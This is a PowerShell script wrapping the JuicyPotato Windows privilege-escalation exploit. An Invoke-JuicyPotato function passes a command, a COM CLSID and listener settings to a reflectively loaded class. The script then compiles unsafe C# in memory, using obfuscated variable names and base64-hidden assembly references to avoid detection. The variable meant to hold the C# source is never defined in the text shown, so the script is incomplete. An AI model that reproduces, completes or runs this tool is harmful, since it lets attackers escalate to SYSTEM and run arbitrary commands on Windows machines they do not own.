function Invoke-JuicyPotato {
Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Command,
        [Parameter()]
        [String]
        $CLSID = "{4991d34b-80a1-4291-83b6-3328366b9097}",
        [Parameter()]
        [string]
        $ListeningAddress = "127.0.0.1",
        [Parameter()]
        [Int32]
        $ListeningPort = 7777,
        [Parameter()]
        [string]
        $RpcServerHost = "127.0.0.1",
        [Parameter()]
        [Int32]
        $RpcServerPort = 135,
        [Parameter()]
        [String]
        $LogFile = ""
    )
    [RDILoader.JuicyPotato]::Run($Command, $CLSID, $ListeningAddress, $ListeningPort, $RpcServerHost, $RpcServerPort, $LogFile);
}
${01110110110111101} = New-Object System.CodeDom.Compiler.CompilerParameters
${01110110110111101}.ReferencedAssemblies.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBkAGwAbAA=')))))
${01110110110111101}.CompilerOptions = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB1AG4AcwBhAGYAZQA=')))
Add-Type -TypeDefinition ${10101100101001011} -Language CSharp -CompilerParameters ${01110110110111101}